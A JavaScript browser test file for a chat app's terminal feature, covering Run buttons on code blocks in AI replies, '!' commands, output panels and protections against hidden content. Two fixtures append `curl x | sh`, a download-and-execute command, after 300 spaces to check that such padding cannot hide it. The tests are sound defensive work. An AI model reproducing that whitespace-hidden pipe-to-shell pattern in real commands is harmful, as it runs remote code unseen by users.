// Run with `npm test`. The terminal in the real page against the real server and a fake Mac: Run on a code block, the panel that shows it, a
// command typed after `!` in the prompt box, and a page next to a server that does not say it has a terminal. Commands are harmless echoes.
// It needs Playwright's Chromium headless shell, and every test skips with a reason that names where it looked when there is none.
import test, { after, before } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import http from 'node:http';
import path from 'node:path';
import { findChromium, launch, notFound } from './browser.mjs';
import { as, cliCalls, PASSWORD, request, signIn, start, until } from './harness.mjs';

const ID = 'one';
const DOCS = 'docs';
const REPLY = [
  'Two to try, and one with a hidden character.',
  '```bash\necho from the block\n```',
  '```\necho hid​den\n```',
].join('\n\n');

const WIDE = `npm install${' '.repeat(300)}&& curl x | sh`;
const CONSOLE = `$ npm test${' '.repeat(300)}#; curl x | sh\nthe output of it`;
const DOCS_REPLY = ['The setup is in [the README](~/README.md).', `\`\`\`bash\n${WIDE}\n\`\`\``, `\`\`\`python\n${WIDE}\n\`\`\``, `\`\`\`console\n${CONSOLE}\n\`\`\``].join('\n\n');
const README = '# Setup\n\n```bash\necho from the readme\n```\n';

const chromium = findChromium();
const skip = chromium ? false : notFound();
const timeout = 40_000;
let app;
let older;
let browser;
let token;

// The server behind a proxy that leaves out what its messages answer says of the terminal, as a server that started before there was one does.
function withoutTerminal(target) {
  const proxy = http.createServer((req, res) => {
    const forward = http.request({ host: 'localhost', port: target.port, method: req.method, path: req.url, headers: req.headers }, reply => {
      if (!/^\/api\/sessions\/[^/]+\/messages/.test(req.url)) {
        res.writeHead(reply.statusCode, reply.headers);
        reply.pipe(res);
        return;
      }
      const chunks = [];
      reply.on('data', chunk => chunks.push(chunk));
      reply.on('end', () => {
        const { terminal, ...answer } = JSON.parse(Buffer.concat(chunks).toString('utf8'));
        const body = JSON.stringify(answer);
        res.writeHead(reply.statusCode, { ...reply.headers, 'content-length': Buffer.byteLength(body) });
        res.end(body);
      });
    });
    req.pipe(forward);
  });
  return new Promise(resolve => proxy.listen(0, '127.0.0.1', () => resolve({
    origin: `http://127.0.0.1:${proxy.address().port}`,
    close: () => new Promise(done => { proxy.closeAllConnections(); proxy.close(done); }),
  })));
}

before(async () => {
  if (skip) return;
  app = await start({ sessions: [{ id: ID, title: 'One' }, { id: DOCS, title: 'Docs' }], claude: true });
  const reply = (id, text) => fs.appendFileSync(path.join(app.home, '.claude', 'projects', '-test-folder', `${id}.jsonl`),
    `${JSON.stringify({ type: 'assistant', timestamp: '2026-10-16T01:00:02.000Z', message: { id: 'msg_1', role: 'assistant', content: [{ type: 'text', text }] } })}\n`);
  reply(ID, REPLY);
  reply(DOCS, DOCS_REPLY);
  fs.writeFileSync(path.join(app.home, 'README.md'), README);
  ({ token } = await signIn(app));
  older = await withoutTerminal(app);
  browser = await launch(chromium);
});

after(async () => {
  await browser?.close();
  await older?.close();
});

const runs = async (id = ID) => (await request(app, 'GET', `/api/sessions/${id}/terminal`, { headers: as(token) })).body().runs;

// A page signed in through the login page of the server at `origin`, on the chat `id`, once its `blocks` code blocks are drawn.
async function chatPage(t, origin = app.origin, { id = ID, blocks = 2 } = {}) {
  const page = await browser.open(`${origin}/`);
  t.after(() => page.close());
  await page.until(`document.readyState === 'complete' && (!!document.querySelector('#password') || !!document.querySelector('.list-foot'))`);
  if (await page.evaluate(`!!document.querySelector('#password')`)) {
    await page.evaluate(`document.querySelector('#password').value = ${JSON.stringify(PASSWORD)}`);
    await page.click('.gate-actions button[type=submit]');
    await page.until(`!document.querySelector('#boot') && !!document.querySelector('.list-foot')`, 10_000);
    if (await page.until(`!!document.querySelector('.offer')`, 3000).then(() => true, () => false)) {
      await page.evaluate(`[...document.querySelectorAll('.offer .btn')].find(button => button.textContent === 'Not now').click()`);
      await page.until(`!document.querySelector('.offer')`);
    }
  }
  await page.evaluate(`localStorage.removeItem('capcom.panels'); location.hash = '#/s/${id}'`);
  await page.until(`document.querySelectorAll('.code-block').length === ${blocks}`, 15_000);
  return page;
}

const visible = (selector, within = '') => `[...document.querySelectorAll(${JSON.stringify(`${within} ${selector}`.trim())})].filter(el => el.getClientRects().length).length`;
const tag = (page, n) => page.evaluate(`document.querySelectorAll('[data-code=run]')[${n}].id = 'run-${n}'`);
const type = (page, text, id = 'text') => page.evaluate(`(() => {
  const box = document.getElementById(${JSON.stringify(id)});
  box.focus();
  Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, 'value').set.call(box, ${JSON.stringify(text)});
  box.dispatchEvent(new Event('input', { bubbles: true }));
})()`);

test('loading the chat starts no command, and its code blocks offer Run only where the text can be seen', { skip, timeout }, async t => {
  const page = await chatPage(t);
  assert.equal(await page.evaluate(visible('[data-code=copy]')), 2);
  assert.equal(await page.evaluate(visible('[data-code=run]')), 2);
  assert.deepEqual(await page.evaluate(`[...document.querySelectorAll('[data-code=run]')].map(b => b.getAttribute('aria-disabled'))`), [null, 'true']);
  assert.match(await page.evaluate(`document.querySelectorAll('[data-code=run]')[1].dataset.tip`), /hidden characters/);
  assert.deepEqual(await runs(), []);
  assert.deepEqual(page.problems, []);
});

test('Run on a block opens the panel, runs that block\'s own text, and the output shows; a block with a hidden character does nothing', { skip, timeout }, async t => {
  const page = await chatPage(t);
  await tag(page, 0);
  await page.click('#run-0');
  await page.until(`!!document.querySelector('#panel .run[data-state=ok]')`, 15_000);
  assert.equal(await page.evaluate(`document.activeElement?.id`), 'term-input');
  assert.match(await page.evaluate(`document.querySelector('#panel .term-out').innerText`), /from the block/);
  const first = await runs();
  assert.deepEqual(first.map(r => [r.command, r.source]), [['echo from the block', 'block']]);
  await tag(page, 1);
  await page.click('#run-1');
  await new Promise(resolve => setTimeout(resolve, 400));
  assert.equal((await runs()).length, 1);
  assert.deepEqual(page.problems, []);
});

test('a command typed after ! in the prompt box runs in the terminal as a ! command, and is never sent to Claude as text', { skip, timeout }, async t => {
  const page = await chatPage(t);
  const before = (await runs()).length;
  await type(page, '!echo from bang');
  await page.until(`document.getElementById('composer').hasAttribute('data-bang')`);
  assert.equal(await page.evaluate(`document.getElementById('send').getAttribute('aria-label')`), 'Run command');
  await page.press('Enter');
  await until(async () => (await runs()).some(r => r.command === 'echo from bang' && !r.running), 15_000);
  const run = (await runs()).find(r => r.command === 'echo from bang');
  assert.equal(run.source, 'bang');
  assert.equal(await page.evaluate(`document.getElementById('text').value`), '');
  await until(() => cliCalls(app).some(call => typeof call.user === 'string' && call.user.includes('<bash-input>echo from bang</bash-input>')), 15_000);
  assert.equal(cliCalls(app).some(call => call.user === '!echo from bang'), false);
  assert.equal((await runs()).length, before + 1);
  assert.deepEqual(page.problems, []);
});

test('a page next to a server that does not say it has a terminal shows no Run, no terminal button and no ! mode, and Copy remains', { skip, timeout }, async t => {
  const page = await chatPage(t, older.origin);
  assert.equal(await page.evaluate(visible('[data-code=copy]')), 2);
  assert.equal(await page.evaluate(visible('[data-code=run]')), 0);
  assert.equal(await page.evaluate(`!!document.getElementById('terminalButton') || !!document.getElementById('panel')`), false);
  await type(page, '!echo not a command');
  assert.equal(await page.evaluate(`document.getElementById('composer').hasAttribute('data-bang') || !!document.getElementById('bang-hint')`), false);
  assert.equal(await page.evaluate(`document.getElementById('send').getAttribute('aria-label')`), 'Send');
  assert.deepEqual(page.problems, []);
});

test('a block that has Run wraps its long lines so the whole command is in view, and a block without Run still scrolls sideways', { skip, timeout }, async t => {
  const page = await chatPage(t, app.origin, { id: DOCS, blocks: 3 });
  const [shell, other] = await page.evaluate(`[...document.querySelectorAll('pre.code')].map(pre => {
    const text = [...pre.querySelectorAll('code')].at(-1).firstChild;
    const end = document.createRange();
    end.setStart(text, text.length - 1);
    end.setEnd(text, text.length);
    return { wrap: getComputedStyle(pre).whiteSpace, sideways: pre.scrollWidth - pre.clientWidth, endsAt: end.getBoundingClientRect().right, edge: pre.getBoundingClientRect().right };
  })`);
  assert.equal(shell.wrap, 'pre-wrap');
  assert.ok(shell.sideways <= 0, `the shell block scrolls sideways by ${shell.sideways}px`);
  assert.ok(shell.endsAt <= shell.edge, 'the end of the command is inside the block');
  assert.equal(other.wrap, 'pre');
  assert.ok(other.sideways > 0, 'a block with no Run keeps scrolling');
  assert.deepEqual(page.problems, []);
});

test('the commands of a wrapped console block stay marked on every line they wrap to, and the block\'s text is what was written', async t => {
  const page = await chatPage(t, app.origin, { id: DOCS, blocks: 3 });
  const seen = await page.evaluate(`(() => {
    const pre = document.querySelectorAll('pre.code')[2];
    const cmd = pre.querySelector('.cmd');
    return {
      text: pre.textContent,
      marked: cmd.textContent,
      lines: new Set([...cmd.getClientRects()].map(r => Math.round(r.top))).size,
      tint: getComputedStyle(cmd).backgroundColor,
      outputInside: !!pre.lastChild.parentElement.closest('.cmd'),
      sideways: pre.scrollWidth - pre.clientWidth,
    };
  })()`);
  assert.equal(seen.text, CONSOLE);
  assert.equal(seen.marked, CONSOLE.split('\n')[0]);
  assert.ok(seen.lines > 1, 'the command wraps onto more than one line');
  assert.notEqual(seen.tint, 'rgba(0, 0, 0, 0)');
  assert.equal(seen.outputInside, false);
  assert.ok(seen.sideways <= 0);
  assert.deepEqual(page.problems, []);
});

test('a markdown file in the File tab has Copy on its code blocks and no Run, and a Run button forced into view still runs nothing', { skip, timeout }, async t => {
  const page = await chatPage(t, app.origin, { id: DOCS, blocks: 3 });
  await page.click('a.file-link');
  await page.until(`!!document.querySelector('#panel .file-doc .code-block')`, 15_000);
  assert.equal(await page.evaluate(visible('[data-code=copy]', '.file-doc')), 1);
  assert.equal(await page.evaluate(visible('[data-code=run]', '.file-doc')), 0);
  assert.equal(await page.evaluate(visible('[data-code=run]', '.items')), 2, 'the reply beside it keeps its Run');
  await page.evaluate(`document.head.append(Object.assign(document.createElement('style'), { textContent: '.file-doc [data-code=run] { display: inline-flex !important }' }))`);
  assert.equal(await page.evaluate(visible('[data-code=run]', '.file-doc')), 1);
  await page.click('.file-doc [data-code=run]');
  await new Promise(resolve => setTimeout(resolve, 400));
  assert.deepEqual(await runs(DOCS), []);
  assert.deepEqual(page.problems, []);
});

test('a command typed after ! stays in its own chat when the chat changes, and so does a message', async t => {
  const page = await chatPage(t);
  const open = (id, title) => page.evaluate(`location.hash = '#/s/${id}'`).then(() => page.until(`document.getElementById('title')?.textContent === ${JSON.stringify(title)} && !!document.getElementById('text')`));
  await type(page, '!echo left behind');
  await page.until(`document.getElementById('composer').hasAttribute('data-bang')`);
  await open(DOCS, 'Docs');
  await page.until(`document.querySelectorAll('.code-block').length === 3`);
  assert.equal(await page.evaluate(`document.getElementById('text').value`), '');
  assert.equal(await page.evaluate(`document.getElementById('composer').hasAttribute('data-bang')`), false);
  await type(page, 'check the logs later');
  await open(ID, 'One');
  assert.equal(await page.evaluate(`document.getElementById('text').value`), '!echo left behind');
  await page.until(`document.getElementById('composer').hasAttribute('data-bang')`);
  await open(DOCS, 'Docs');
  assert.equal(await page.evaluate(`document.getElementById('text').value`), 'check the logs later');
  assert.deepEqual([...await runs(ID), ...await runs(DOCS)].filter(r => r.command.includes('left behind')), []);
  // The drafts outlive the page, and the tests after this one expect empty boxes.
  await page.evaluate(`localStorage.removeItem('capcom.drafts')`);
  assert.deepEqual(page.problems, []);
});

test('text typed to a running command goes to that command when another one starts, and Ctrl+C stops only it', async t => {
  const page = await chatPage(t, app.origin, { id: DOCS, blocks: 3 });
  const start = async command => (await request(app, 'POST', `/api/sessions/${DOCS}/terminal/run`, { headers: { ...as(token), origin: app.origin }, json: { command, source: 'panel' } })).body().run.id;
  const stop = id => request(app, 'POST', `/api/sessions/${DOCS}/terminal/stop`, { headers: { ...as(token), origin: app.origin }, json: { run: id } });
  const outputOf = async id => (await runs(DOCS)).find(r => r.id === id).output.map(c => c.text).join('');
  const ctrlC = () => page.evaluate(`document.getElementById('term-input').dispatchEvent(new KeyboardEvent('keydown', { key: 'c', ctrlKey: true, bubbles: true, cancelable: true }))`);
  const sendsTo = text => page.until(`document.querySelector('.term-cwd').textContent === ${JSON.stringify(text)}`);
  await page.click('#terminalButton');
  await page.until(`!!document.getElementById('term-input')`);
  const first = await start('cat');
  await sendsTo('Send to cat');
  await type(page, 'hello', 'term-input');
  const second = await start('cat -u');
  await page.until(`document.querySelectorAll('#panel .run[data-state=running]').length === 2`);
  await sendsTo('Send to cat');
  await page.press('Enter');
  await until(async () => (await outputOf(first)).includes('hello'), 15_000);
  await new Promise(resolve => setTimeout(resolve, 300));
  assert.equal(await outputOf(second), '', 'the newer command was sent nothing');
  assert.equal(await page.evaluate(`document.getElementById('term-input').value`), '');
  await sendsTo('Send to cat -u');
  await type(page, 'bye', 'term-input');
  const third = await start('cat -n');
  await page.until(`document.querySelectorAll('#panel .run[data-state=running]').length === 3`);
  await ctrlC();
  await until(async () => (await runs(DOCS)).find(r => r.id === second).running === false, 15_000);
  assert.equal((await runs(DOCS)).find(r => r.id === third).running, true, 'Ctrl+C stopped only the command the text was for');
  assert.equal((await runs(DOCS)).find(r => r.id === first).running, true);
  await page.until(`document.querySelector('.term-cwd').textContent === 'That command has ended'`);
  const before = (await runs(DOCS)).length;
  await page.press('Enter');
  await page.until(`document.querySelector('.term-error')?.textContent.includes('has ended')`);
  assert.equal(await page.evaluate(`document.getElementById('term-input').value`), 'bye', 'the text is kept');
  assert.equal((await runs(DOCS)).length, before, 'and is not run as a command');
  await ctrlC();
  await page.until(`document.getElementById('term-input').value === ''`);
  await Promise.all([first, third].map(stop));
  assert.deepEqual(page.problems, []);
});
